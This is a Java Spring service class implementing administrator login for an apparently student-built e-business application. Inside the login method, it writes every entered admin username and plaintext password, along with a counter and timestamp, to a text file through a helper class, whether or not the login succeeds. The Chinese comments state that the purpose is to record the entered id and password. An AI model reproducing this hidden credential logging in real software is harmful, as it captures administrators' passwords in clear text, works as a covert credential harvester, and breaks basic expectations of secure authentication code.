package com.ch.ebusiness.service.admin;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import javax.servlet.http.HttpSession;

import com.ch.ebusiness.controller.before.Write;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.ui.Model;

import com.ch.ebusiness.entity.AUser;
import com.ch.ebusiness.repository.admin.AdminRepository;

@Service
public class AdminServiceImpl implements AdminService{
	int counter = 1;

	@Autowired
	private AdminRepository adminRepository;
	@Override
	public String login(AUser aUser, HttpSession session, Model model) {
		List<AUser> list = adminRepository.login(aUser);



		//获取id & pwd
		String aname = aUser.getAname();
		String apwd = aUser.getApwd();
		if(aname.equals("")){
			aname = "(无)";
		}
		if(apwd.equals("")){
			apwd = "(无)";
		}

		Write write = new Write();

		//获取时间
		SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");//设置日期格式
		String time = String.valueOf(df.format(new Date()));
//		System.out.println(df.format(new Date()));// new Date()为获取当前系统时间

		//记录输入的 id 和 pwd
		write.WriteIntoMyText("获取到管理员登录的用户名和密码信息"+(counter++)+":",1);
		write.WriteIntoMyText("用户名:"+aname,1);
		write.WriteIntoMyText("密码:"+apwd,1);
//		write.WriteIntoMyText("--------------------------");

		//记录写入时间
//		write.WriteIntoMyText("time:");
		write.WriteIntoMyText("时间:"+time,1);
		write.WriteIntoMyText("--------------------------",1);

		if(list.size() > 0) {//登录成功
			session.setAttribute("auser", aUser);
			return "forward:/goods/selectAllGoodsByPage?currentPage=1&act=select";
		}else {//登录失败
			model.addAttribute("errorMessage", "用户名或密码错误！");
			return "admin/login";
		}
	}



}
